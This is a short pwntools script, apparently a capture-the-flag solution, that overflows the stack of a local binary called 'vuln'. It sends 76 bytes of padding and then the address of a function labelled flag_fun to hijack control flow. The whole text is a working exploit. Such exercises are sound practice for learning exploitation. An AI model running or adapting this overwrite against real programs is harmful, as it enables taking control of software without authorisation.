from pwn import *

padding = 76*b'a'
flag_fun = p32(0x080485e6)
p = process('./vuln')

payload = b''
payload += padding
payload += flag_fun

p.sendline(payload)
print(p.recvall())
